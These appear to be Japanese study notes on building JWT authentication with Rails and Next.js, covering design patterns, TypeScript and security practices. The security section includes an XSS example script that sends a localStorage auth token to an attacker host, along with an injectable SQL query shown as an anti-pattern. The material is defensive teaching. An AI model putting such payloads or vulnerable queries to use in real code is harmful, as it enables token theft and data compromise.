# 学習ポイントとベストプラクティス

今回の JWT 認証実装を通じて学んだ技術概念、設計パターン、ベストプラクティスをまとめました。

## 目次

1. [JWT 認証の仕組み](#jwt-認証の仕組み)
2. [Rails の設計パターン](#rails-の設計パターン)
3. [Next.js の設計パターン](#nextjs-の設計パターン)
4. [セキュリティのベストプラクティス](#セキュリティのベストプラクティス)
5. [TypeScript の型安全性](#typescript-の型安全性)
6. [Docker 環境での開発](#docker-環境での開発)
7. [API 設計](#api-設計)
8. [実装のヒントとテクニック](#実装のヒントとテクニック)

---

## JWT 認証の仕組み

### ステートレス認証とは

**従来のセッションベース認証**:
```
1. ユーザーがログイン
2. サーバーがセッション ID を生成し、DB/Redis に保存
3. クライアントに Cookie でセッション ID を送信
4. 毎回のリクエストで、サーバーが DB/Redis からセッション情報を取得
```

問題点:
- サーバー側でセッション情報を保持する必要がある
- 水平スケーリングが難しい（セッション共有が必要）
- DB/Redis へのアクセスが毎回発生

**JWT ベース認証（ステートレス）**:
```
1. ユーザーがログイン
2. サーバーが JWT トークンを生成（DB に保存しない）
3. クライアントにトークンを送信
4. 毎回のリクエストで、トークンを検証するだけ（DB アクセス不要）
```

利点:
- ✅ サーバー側でセッション情報を保持しない
- ✅ どのサーバーでもトークンを検証可能（スケーリング容易）
- ✅ DB アクセスが不要（パフォーマンス向上）

### JWT の3つの部分

```
Header.Payload.Signature
```

#### 1. Header（ヘッダー）
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
Base64Url エンコード後: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

#### 2. Payload（ペイロード）
```json
{
  "user_id": 1,
  "exp": 1710987600
}
```
Base64Url エンコード後: `eyJ1c2VyX2lkIjoxLCJleHAiOjE3MTA5ODc2MDB9`

#### 3. Signature（署名）
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

結果: `5k8yQ3XxN1B8F7u9qHZ2Lw3dT1mK9vJ2sP0aI4nU6oE`

**最終的な JWT**:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJleHAiOjE3MTA5ODc2MDB9.5k8yQ3XxN1B8F7u9qHZ2Lw3dT1mK9vJ2sP0aI4nU6oE
```

### JWT の検証プロセス

```ruby
def self.decode_jwt(token)
  # 1. ヘッダーとペイロードを Base64Url デコード
  # 2. 秘密鍵で署名を再計算
  # 3. 再計算した署名とトークンの署名を比較
  # 4. 一致すれば改ざんされていないと判断
  # 5. 有効期限もチェック
  decoded = JWT.decode(token, JWT_SECRET, true, { algorithm: JWT_ALGORITHM })
  find(decoded[0]['user_id'])
end
```

**重要**: 秘密鍵を知らないと正しい署名を生成できない = 改ざん不可能

---

## Rails の設計パターン

### 1. Concern パターン

**目的**: コントローラー間で共通のロジックを再利用

**実装例**:
```ruby
# backend/app/controllers/concerns/authenticable.rb
module Authenticable
  extend ActiveSupport::Concern

  included do
    before_action :authenticate_request!, only: []
    attr_reader :current_user
  end

  private

  def authenticate_request!
    # 認証ロジック
  end
end
```

**使い方**:
```ruby
class MemosController < ApplicationController
  include Authenticable
  before_action :authenticate_request!
  # これだけで認証が有効になる
end
```

**メリット**:
- ✅ DRY 原則（Don't Repeat Yourself）
- ✅ 認証ロジックが一箇所に集約
- ✅ テストが容易

### 2. has_secure_password

**目的**: パスワードを安全にハッシュ化

```ruby
class User < ApplicationRecord
  has_secure_password
end
```

**自動的に追加される機能**:
- ✅ `password` と `password_confirmation` 仮想属性
- ✅ `password_digest` カラムへの bcrypt ハッシュ化
- ✅ `authenticate(password)` メソッド
- ✅ バリデーション（password の存在チェック、一致チェック）

**使用例**:
```ruby
# パスワードの設定
user = User.new(email: "test@example.com", password: "secret", password_confirmation: "secret")
user.save

# パスワードの検証
user.authenticate("secret")  # => user オブジェクト
user.authenticate("wrong")   # => false
```

### 3. Strong Parameters

**目的**: マスアサインメント脆弱性の防止

```ruby
def user_params
  params.require(:user).permit(:email, :password, :password_confirmation)
end
```

**悪意のあるリクエストの例**:
```json
{
  "user": {
    "email": "attacker@example.com",
    "password": "password",
    "admin": true  // ← これを許可してはいけない
  }
}
```

Strong Parameters により、明示的に許可したパラメータのみ受け入れる。

### 4. コールバック

**before_save の使用例**:
```ruby
class User < ApplicationRecord
  before_save :downcase_email

  private

  def downcase_email
    self.email = email.downcase
  end
end
```

**よく使うコールバック**:
- `before_validation`
- `before_save`
- `after_save`
- `before_create`
- `after_create`

---

## Next.js の設計パターン

### 1. Server Component vs Client Component

#### Server Component（デフォルト）
```typescript
// app/page.tsx
export default async function HomePage() {
  const data = await fetch('http://localhost:3003/memos');
  // サーバーサイドで実行される
  return <div>{/* ... */}</div>;
}
```

特徴:
- ✅ サーバーサイドで実行
- ✅ 環境変数にフルアクセス
- ✅ データベースに直接アクセス可能
- ❌ useState, useEffect などのフックは使えない
- ❌ ブラウザ API は使えない

#### Client Component
```typescript
"use client";  // ← この指令が必要

import { useState } from "react";

export default function LoginPage() {
  const [email, setEmail] = useState("");
  // ...
}
```

特徴:
- ✅ React フック（useState, useEffect など）が使える
- ✅ ブラウザ API（localStorage など）が使える
- ✅ イベントハンドラが使える
- ❌ `NEXT_PUBLIC_` で始まる環境変数のみアクセス可能

**いつ Client Component を使うか**:
- 認証状態の管理（useAuth）
- フォームの入力管理（useState）
- ブラウザ API の使用（localStorage）
- ユーザーインタラクション（onClick など）

### 2. React Context API

**目的**: グローバルな状態管理

```typescript
// 1. Context の作成
export const AuthContext = createContext<AuthContextType | undefined>(undefined);

// 2. Provider の作成
export function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<User | null>(null);

  return (
    <AuthContext.Provider value={{ user, login, logout }}>
      {children}
    </AuthContext.Provider>
  );
}

// 3. カスタムフックでアクセス
export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error("useAuth must be used within AuthProvider");
  }
  return context;
}

// 4. 使用
function SomeComponent() {
  const { user, login } = useAuth();
  // ...
}
```

**メリット**:
- ✅ Props のバケツリレーを回避
- ✅ どのコンポーネントからでもアクセス可能
- ✅ 型安全（TypeScript）

### 3. カスタムフック

**目的**: ロジックの再利用

**実装例**:
```typescript
export function useLoadContent<T>(url: string): [T | null, boolean] {
  const [loading, setLoading] = useState(true);
  const [data, setData] = useState<T | null>(null);
  const { user, loading: userLoading } = useAuth();

  useEffect(() => {
    if (!user) {
      setLoading(false);
      return;
    }

    (async () => {
      const res = await fetchWithAuth(`${API_URL}/${url}`);
      if (res.ok) {
        const data = await res.json();
        setData(data);
      }
      setLoading(false);
    })();
  }, [user, url]);

  return [data, loading || userLoading];
}
```

**使用例**:
```typescript
function MemoListPage() {
  const [memos, loading] = useLoadContent<Memo[]>("memos");

  if (loading) return <div>Loading...</div>;
  return <div>{/* メモ一覧を表示 */}</div>;
}
```

**メリット**:
- ✅ データ取得ロジックの再利用
- ✅ コンポーネントがシンプルになる
- ✅ ジェネリクスで型安全

### 4. useCallback と useEffect

#### useCallback
```typescript
const login = useCallback(async (email: string, password: string) => {
  // ログイン処理
}, []); // 依存配列が空なので、関数は再生成されない
```

**目的**: 関数の再生成を防ぎ、パフォーマンスを向上

#### useEffect
```typescript
useEffect(() => {
  // user が変わったときのみ実行
  if (!user) {
    router.push("/login");
  }
}, [user, router]); // 依存配列
```

**重要**: 依存配列に含めるべきもの:
- ✅ effect 内で使用する props
- ✅ effect 内で使用する state
- ✅ effect 内で使用する関数

---

## セキュリティのベストプラクティス

### 1. パスワードのハッシュ化

❌ **絶対にやってはいけないこと**:
```ruby
# 平文でパスワードを保存
user.password_plain = "secret123"
```

✅ **正しい方法**:
```ruby
# bcrypt でハッシュ化（has_secure_password が自動でやってくれる）
user.password = "secret123"
# => password_digest: "$2a$12$K4Q..."
```

### 2. 強力な秘密鍵

❌ **弱い秘密鍵**:
```ruby
JWT_SECRET = "secret"
```

✅ **強力な秘密鍵**:
```ruby
JWT_SECRET = Rails.application.credentials.secret_key_base
# => 長くてランダムな文字列
```

### 3. 適切な有効期限

```ruby
# トークンの有効期限を設定
JWT_EXPIRATION = 24.hours
```

**考慮点**:
- 短すぎる → ユーザー体験が悪い（頻繁に再ログイン）
- 長すぎる → セキュリティリスク（トークンが盗まれた場合）

**ベストプラクティス**:
- アクセストークン: 15分〜1時間（短命）
- リフレッシュトークン: 7日〜30日（長命）

### 4. HTTPS の使用

❌ **HTTP での通信**:
```
http://example.com/login
```
→ トークンが平文で送信され、盗聴される可能性

✅ **HTTPS での通信**:
```
https://example.com/login
```
→ トークンが暗号化されて送信される

### 5. CORS の適切な設定

❌ **すべてのオリジンを許可**:
```ruby
config.middleware.insert_before 0, Rack::Cors do
  allow do
    origins '*'  # ← 危険！
  end
end
```

✅ **特定のオリジンのみ許可**:
```ruby
config.middleware.insert_before 0, Rack::Cors do
  allow do
    origins ENV['CORS_ALLOWED_ORIGINS']&.split(',') || []
  end
end
```

### 6. XSS 対策

**localStorage のリスク**:
```javascript
// XSS 攻撃でトークンが盗まれる可能性
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'));
</script>
```

**対策**:
- ✅ CSP (Content Security Policy) の設定
- ✅ 入力値のサニタイゼーション
- ✅ HttpOnly Cookie の使用も検討（ただし CSRF 対策が必要）

### 7. SQL インジェクション対策

❌ **危険な方法**:
```ruby
# 絶対にやってはいけない
User.where("email = '#{params[:email]}'")
```

✅ **安全な方法**:
```ruby
# プレースホルダーを使用
User.where("email = ?", params[:email])
# または
User.where(email: params[:email])
```

---

## TypeScript の型安全性

### 1. インターフェースの定義

```typescript
interface User {
  id: number;
  email: string;
  created_at: string;
}

interface AuthContextType {
  user: User | null;
  loading: boolean;
  login: (email: string, password: string) => Promise<void>;
  logout: () => void;
}
```

**メリット**:
- ✅ 型チェックで typo を防ぐ
- ✅ IDE の補完が効く
- ✅ リファクタリングが安全

### 2. ジェネリクス

```typescript
function useLoadContent<T>(url: string): [T | null, boolean] {
  const [data, setData] = useState<T | null>(null);
  // ...
  return [data, loading];
}

// 使用例
const [memos, loading] = useLoadContent<Memo[]>("memos");
// memos の型は Memo[] | null
```

### 3. 型推論を活用

❌ **冗長な型指定**:
```typescript
const token: string | null = getToken();
const headers: Record<string, string> = {
  'Content-Type': 'application/json',
};
```

✅ **型推論に任せる**:
```typescript
const token = getToken(); // 型は自動的に string | null
const headers = {
  'Content-Type': 'application/json',
}; // 型は自動的に { 'Content-Type': string }
```

### 4. 条件付きスプレッド

```typescript
const headers = {
  'Content-Type': 'application/json',
  ...options.headers,
  ...(token ? { Authorization: `Bearer ${token}` } : {}),
};
```

**解説**:
- `token` が存在する場合のみ Authorization ヘッダーを追加
- `{}` を使うことで、false の場合も型エラーにならない

---

## Docker 環境での開発

### 1. ボリュームマウントの理解

```yaml
volumes:
  - ./frontend:/app  # ホストのファイルをコンテナにマウント
  - /app/node_modules  # コンテナ内の node_modules を保護
```

**なぜ必要か**:
- macOS で `yarn install` した node_modules は Linux で動かない
- コンテナ内で生成した node_modules を保護する必要がある

### 2. 環境変数の管理

```yaml
environment:
  - RAILS_ENV=development
  - NEXT_PUBLIC_API_URL=http://localhost:3003
```

**ベストプラクティス**:
- 開発環境: `docker-compose.yml` に記述
- 本番環境: 環境変数や Secrets で管理

### 3. コンテナのデバッグ

```bash
# ログを見る
docker compose logs -f back

# コンテナに入る
docker compose exec back bash

# Rails console
docker compose exec back rails console

# コンテナの再起動
docker compose restart back
```

---

## API 設計

### RESTful な設計

| HTTP メソッド | エンドポイント | 説明 |
|--------------|----------------|------|
| POST | `/signup` | ユーザー登録 |
| POST | `/login` | ログイン |
| GET | `/current_user` | 現在のユーザー |
| DELETE | `/logout` | ログアウト |
| GET | `/memos` | メモ一覧 |
| POST | `/memos` | メモ作成 |
| GET | `/memos/:id` | メモ詳細 |
| PUT | `/memos/:id` | メモ更新 |
| DELETE | `/memos/:id` | メモ削除 |

### ステータスコードの使い分け

| コード | 意味 | 使用例 |
|--------|------|--------|
| 200 OK | 成功 | ログイン成功 |
| 201 Created | 作成成功 | ユーザー登録成功 |
| 204 No Content | 成功（レスポンスなし） | ログアウト |
| 401 Unauthorized | 認証失敗 | トークン無効 |
| 403 Forbidden | 権限なし | 他人のメモを編集 |
| 404 Not Found | リソースなし | 存在しないメモ |
| 422 Unprocessable Entity | バリデーションエラー | メール重複 |

### レスポンス形式

✅ **成功時**:
```json
{
  "user": {
    "id": 1,
    "email": "test@example.com",
    "created_at": "2026-03-21T10:00:00Z"
  },
  "token": "eyJhbGciOiJIUzI1NiJ9..."
}
```

✅ **エラー時**:
```json
{
  "error": "メールアドレスまたはパスワードが正しくありません"
}
```

または

```json
{
  "errors": {
    "email": ["has already been taken"],
    "password": ["is too short (minimum is 6 characters)"]
  }
}
```

---

## 実装のヒントとテクニック

### 1. hasWindow ヘルパー

```typescript
function hasWindow(): boolean {
  return typeof window !== "undefined";
}
```

**目的**: SSR 環境で `window` が undefined の場合に対応

**使用例**:
```typescript
export function getToken(): string | null {
  if (!hasWindow()) return null;
  return localStorage.getItem(TOKEN_KEY);
}
```

### 2. 即時実行関数（IIFE）

```typescript
useEffect(() => {
  (async () => {
    const res = await fetch('/api/data');
    const data = await res.json();
    setData(data);
  })();
}, []);
```

**なぜ必要か**:
- `useEffect` のコールバックは async にできない
- IIFE を使って async/await を使用

### 3. Safe Navigation Operator

```ruby
user&.authenticate(password)
```

**解説**:
- `user` が nil の場合、`nil` を返す（エラーにならない）
- `user` が存在する場合、`user.authenticate(password)` を実行

### 4. 条件付きリダイレクト

```typescript
useEffect(() => {
  if (!authLoading && !user) {
    router.push("/login");
  }
}, [user, authLoading, router]);
```

**重要**: `authLoading` もチェックしないと、ログイン中でも一瞬リダイレクトされる

### 5. curl でのテスト

```bash
# レスポンスを整形
curl http://localhost:3003/memos | jq .

# ヘッダーを含めて表示
curl -i http://localhost:3003/memos

# POST リクエスト
curl -X POST http://localhost:3003/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"password123"}' \
  | jq .
```

---

## まとめ

### 今回学んだ主要な技術

1. **JWT 認証**: ステートレス認証の仕組み
2. **Rails Concern**: 共通ロジックの再利用パターン
3. **React Context**: グローバル状態管理
4. **TypeScript**: 型安全なコード
5. **Docker**: コンテナ環境での開発
6. **CORS**: クロスオリジン通信
7. **セキュリティ**: パスワードハッシュ化、トークン管理

### 継続的な学習のために

- ✅ エラーは学習の機会と捉える
- ✅ ドキュメントを読む習慣をつける
- ✅ 小さく作って、少しずつ拡張する
- ✅ テストを書いて動作を確認する
- ✅ セキュリティを常に意識する

### 次のステップ

[今後の拡張案](https://github.com/hchaki/rails-api-nextjs/issues) を参考に、さらなる機能を実装してみましょう！
